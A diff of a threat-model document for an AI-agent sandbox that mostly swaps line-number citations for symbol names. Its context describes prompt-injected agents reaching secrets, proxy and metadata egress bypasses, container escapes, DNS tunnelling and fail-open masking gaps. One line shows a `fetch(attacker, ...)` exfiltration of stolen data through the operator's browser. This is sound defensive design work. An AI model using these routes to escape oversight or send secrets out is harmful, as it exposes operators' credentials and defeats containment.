@@ -203,7 +203,7 @@ the canary, never merely claimed because a policy object was applied.
 |---|---|---|
 | Prompt-injected agent reads resident secrets | Secrets are never in the sandbox, with a set of named, bounded exceptions — **§5.1a carries the complete list** (the SSH/git-PAT SCM lanes, Bedrock's SigV4 modes incl. the captured AWS SSO token and the role credentials derived from it, the `~/.aws` and inject-off `~/.claude` mounts, and container-login runs), each with what lands, why it can't be proxy-injected, and what bounds it. Every other third-party credential is late-bound via the broker; proxy-side credential injection so the agent process never holds a bearer token. SecretRegistry output masking (`<secret-hidden>`) on the default brokered recording-upload path + audit events + proxy decision logs **[shipped]** (`internal/secretmask`; verbatim-match only — on the recording-upload path the body is asciicast JSON, so each secret's JSON-escaped rendering is masked alongside its raw bytes (`JSONEscapedVariants`), which covers multi-line keys and quote/backslash-bearing values; a secret SPLIT across two output events by the recorder's PTY read boundaries stays a residual the verbatim match cannot close, since the `"],[t,"o","` event framing interrupts the byte run — the live-attach path masks raw PTY bytes and is unaffected). TWO named unmasked paths. (a) The optional `WARDYN_RECORDING_MOUNT`/`-out-dir` single-host recording fallback bypasses the control plane and therefore delivers UNMASKED casts (masking is structurally control-plane-side — `wardyn-rec` holds no secret values by design); do not use it where recordings are viewer-exposed. (b) The registry itself is **process-local and fails OPEN**: `secretmask.Registry` is an in-memory map, never persisted, populated on whichever wardynd process served the run's injection/mint request; the cast upload and the live-attach relay are separate requests, and both fall back to an unmasked pass-through when the run's snapshot is empty (`buildMaskingBody`, `liveMaskWriter`). One process, one replica — the shipped topology everywhere — makes the CROSS-REPLICA form of this inert, which is why `replicas: 1` is a SAFETY control and the Helm chart now refuses more (`deploy/helm/wardyn/templates/deployment.yaml`) and compose's `container_name` rejects `--scale`. Run a second replica anyway and a cast landing on the wrong pod is persisted verbatim, live credentials in cleartext, with a `success` audit event. **The single-process case is not inert**: a `wardynd` restart (upgrade, crash) mid-run empties the same in-memory map, so a run whose secrets registered pre-restart and whose cast uploads post-restart hits the identical empty-snapshot fail-open at `replicas: 1`. | B1, B2, B4 |
 | Env-var proxy bypass (documented industry bypass class) | Designed out at L0: the sandbox network is gatewayless (`Internal:true`), so ignoring the (compatibility-only) `HTTP_PROXY`/`HTTPS_PROXY` env vars reaches no route — the sole off-host path is the wardyn-proxy sidecar. **[shipped]** | L0, B2 |
-| Direct-IP / non-HTTP / metadata-server (169.254.169.254) egress | Two independent layers already close this — L1 below adds depth, it is not what this residual is waiting on. **L0 [shipped]:** each run's Docker network is `Internal:true` (gatewayless), so the sandbox has no off-host route at all; 169.254.169.254 is structurally unreachable regardless of what runs inside it. **L2 [shipped]:** even a request that DOES reach the proxy is independently checked against an unconditional IP guard — a literal-IP target is denied before policy or approval ever run (`evaluate` step 0, `internal/egress/proxy/proxy.go`), and every direct-dialed hostname is re-vetted post-DNS-resolution (`VetHost`/`isBlockedIP`, `policy.go:366,409`) against loopback/link-local/multicast/unspecified, RFC1918/ULA/reserved, and NAT64-embedded-v4 ranges — a check that runs AFTER, and is unaffected by, the policy verdict, so a host that `allow_all_egress` would otherwise pass is still denied if it resolves into one of those ranges (the one hop that defers this post-resolution re-check — the opt-in upstream corp-proxy lane, where the corp proxy performs its own DNS+dial — is §5's disclosed TOCTOU residual, and the step-0 literal-IP denial still holds there). L2's guard lives in the proxy's own code, not the network topology, so — unlike L0 — it does not depend on Docker's gatewaylessness to hold. L1 default-deny nftables/NetworkPolicy + an explicit cloud-metadata firewall **[v0.5+ — planned]** is a third, kernel-level layer for defense-in-depth (chiefly: a non-HTTP path that bypasses the proxy process entirely, and parity on the v0.5 Kubernetes topology, where a pod is not gatewayless by default the way a Docker `Internal:true` network is) — not a precondition for the metadata block itself. | L0, L2 (L1 v0.5 adds depth) |
+| Direct-IP / non-HTTP / metadata-server (169.254.169.254) egress | Two independent layers already close this — L1 below adds depth, it is not what this residual is waiting on. **L0 [shipped]:** each run's Docker network is `Internal:true` (gatewayless), so the sandbox has no off-host route at all; 169.254.169.254 is structurally unreachable regardless of what runs inside it. **L2 [shipped]:** even a request that DOES reach the proxy is independently checked against an unconditional IP guard — a literal-IP target is denied before policy or approval ever run (`evaluate` step 0, `internal/egress/proxy/proxy.go`), and every direct-dialed hostname is re-vetted post-DNS-resolution (`VetHost`/`isBlockedIP`, `internal/egress/proxy/policy.go`) against loopback/link-local/multicast/unspecified, RFC1918/ULA/reserved, and NAT64-embedded-v4 ranges — a check that runs AFTER, and is unaffected by, the policy verdict, so a host that `allow_all_egress` would otherwise pass is still denied if it resolves into one of those ranges (the one hop that defers this post-resolution re-check — the opt-in upstream corp-proxy lane, where the corp proxy performs its own DNS+dial — is §5's disclosed TOCTOU residual, and the step-0 literal-IP denial still holds there). L2's guard lives in the proxy's own code, not the network topology, so — unlike L0 — it does not depend on Docker's gatewaylessness to hold. L1 default-deny nftables/NetworkPolicy + an explicit cloud-metadata firewall **[v0.5+ — planned]** is a third, kernel-level layer for defense-in-depth (chiefly: a non-HTTP path that bypasses the proxy process entirely, and parity on the v0.5 Kubernetes topology, where a pod is not gatewayless by default the way a Docker `Internal:true` network is) — not a precondition for the metadata block itself. | L0, L2 (L1 v0.5 adds depth) |
 | MCP/tool-call egress that bypasses the network proxy | Caught at L3 separate tool-call gateway enforcement plane (the documented MCP-blind-firewall class designed out). **[v0.5+ — planned]**; L3 does not exist today, so this class is currently open below L2. | L3, B3 |
 | Container-runtime escape via known runc/containerd CVE classes | On the shipped Docker path: cap-drop ALL + no-new-privileges + tmpfs + RuntimeDefault seccomp (never `unconfined`) + host-gated AppArmor (`apparmor=docker-default`) pinning **[shipped]**; on Kubernetes, container-level PSS hardening (RunAsNonRoot, drop-ALL caps, no privilege escalation, RuntimeDefault seccomp — `baseSecurityContext`, `internal/runner/k8s/naming.go`) is **[shipped]** on every pod, while userns (`hostUsers:false`) + no hostPath stay **[planned]**. Default CC2 (gVisor) interposes a userspace kernel when `runsc` is present. | CC2 isolation, L0 |
 | Syscall-surface kernel attacks | In scope at CC2 (gVisor userspace kernel interception) default and CC3 (Kata hardware-virt boundary) for adversarial workloads. | CC2, CC3 |
@@ -264,7 +264,7 @@ hiding them would repeat the failure mode we are designed to avoid.
 3. **DNS-tunneling through the mandatory permitted resolver** is a residual
    channel below the TLS-intercept tier.
 
-4. **Kernel 0-day on Tier-1 hardened-runc hosts (shared kernel).** runc-as-sole-
+4. **Kernel 0-day on CC1 hardened-runc hosts (shared kernel).** runc-as-sole-
    boundary is explicitly insufficient for LLM-generated code; this tier alone
    is published as the weakest. A kernel 0-day defeats the sandbox boundary. The
    gVisor sentry 0-day / compatibility-gap class similarly applies to CC2 (e.g.,
@@ -310,7 +310,7 @@ hiding them would repeat the failure mode we are designed to avoid.
    (no network path, no resident credentials outside the §5.1a exceptions)
    enforced out-of-band.
 
-6. **Host eBPF blindness to in-guest syscalls under Tier-3 Kata microVMs.**
+6. **Host eBPF blindness to in-guest syscalls under CC3 Kata microVMs.**
    Requires an in-guest sensor or orchestration-layer audit fallback. This is a
    published gap; Tetragon inside the Kata guest is the mitigation path.
 
@@ -696,14 +696,14 @@ hiding them would repeat the failure mode we are designed to avoid.
     scripting within the relay's shared origin; this is the separate,
     un-analyzed direction. `handleUIRelay` (`internal/api/uigateway.go`)
     serves the sandbox's own app content, and its doc comment is explicit
-    that this adds "no new network path out of the sandbox" (`uigateway.go:9`)
+    that this adds "no new network path out of the sandbox" (the `uigateway.go` package doc)
     — true for the sandbox's netns. But the HTML/JS that content contains
     then runs in the **operator's own browser**, which is not confined by
     Wardyn at all: a `fetch(attacker, {mode:'no-cors', body:stolen})` issued
     by sandbox-authored JS reaches the open internet through the operator's
     normal browser networking, entirely outside `wardyn-proxy` and any egress
     policy. The relay deliberately sets no CSP or `X-Frame-Options`
-    (`uigateway.go:171`, comment: "this origin serves the sandbox's own app,
+    (`UIGatewayHandler`, comment: "this origin serves the sandbox's own app,
     and the console's policy would break it") — a reasonable call for
     serving an arbitrary dev server, but it means nothing on this response
     constrains what that page's script can reach. Audit records only
@@ -717,9 +717,9 @@ hiding them would repeat the failure mode we are designed to avoid.
 
 22. **The UI-relay's 8-hour session cookie re-checks the run's state, not the
     principal's current authorization.** `uiSessionTTL` is 8 hours
-    (`internal/api/uigateway.go:84`); the cookie is minted once, at
+    (`uiSessionTTL`, `internal/api/uigateway.go`); the cookie is minted once, at
     `handleUIEnter` time, against the caller's role at that moment
-    (`uigateway.go:346-364`). Every subsequent relayed request re-validates
+    (`handleUIEnter`). Every subsequent relayed request re-validates
     only that the underlying run is still live (`uigateway.go`'s dial path) —
     it never re-checks that the cookie's principal is still an admin, still
     owns the run, or still exists as an active session. Revoke an admin's
@@ -753,12 +753,12 @@ hiding them would repeat the failure mode we are designed to avoid.
 
 24. **`TestAuthzMatrix`'s "cannot go stale" invariant does not cover the
     UI-sandbox gateway.** The matrix's own coverage-boundary comment
-    (`internal/api/authz_test.go:28-41`) names exactly one excluded surface —
+    (`TestAuthzMatrix`'s doctrine comment, `internal/api/authz_test.go`) names exactly one excluded surface —
     the SSH gateway's separate listener — and explains why: `chi.Walk`
-    (`authz_test.go:371`) only discovers routes on `srv.router`, so a
+    (`TestAuthzMatrix`'s `chi.Walk` enumeration) only discovers routes on `srv.router`, so a
     route living on a different `http.Handler` is invisible to it whether or
     not the comment says so. The UI-sandbox gateway is the second such
-    surface: `UIGatewayHandler` (`internal/api/uigateway.go:164-184`) is wired
+    surface: `UIGatewayHandler` (`UIGatewayHandler`) is wired
     as its own listener/handler, never registered on `srv.router`, so it is
     exactly as invisible to `TestAuthzMatrix` as SSH is — but the comment
     does not say so, which reads as a stronger guarantee ("every route") than
@@ -1117,7 +1117,7 @@ These risks are tracked as explicit obligations, not ignored:
    stays opaque. Per-workspace ephemeral-CA injection into arbitrary agent
    images is unprototyped.
 
-6. **Tier-1 hardened-runc is the only tier on hosts where nothing else installs,
+6. **CC1 hardened-runc is the only tier on hosts where nothing else installs,
    yet shares the host kernel.** Customers on tier-1 only get materially weaker
    isolation and must be told so explicitly, or the platform inherits
    the industry's sandbox-overclaim risk.
@@ -1448,7 +1448,7 @@ built for a different job:
    what Wardyn ships today, free, as `wait_for_review` (§4): the connection
    stays open, a human decides, and on approval the SAME request completes —
    no retry, no restart. (Degrades closed, never to allow, on a 30s hold
-   timeout — `internal/egress/proxy/approvals.go:84`.)
+   timeout — `defaultHoldTimeout`, `internal/egress/proxy/approvals.go`.)
 3. **The credential still reaches the caller.** HashiCorp Vault's own
    quickstart returns the plaintext secret in the API response; Teleport's
    `tbot` writes credentials to disk for downstream tools to read. Short-lived
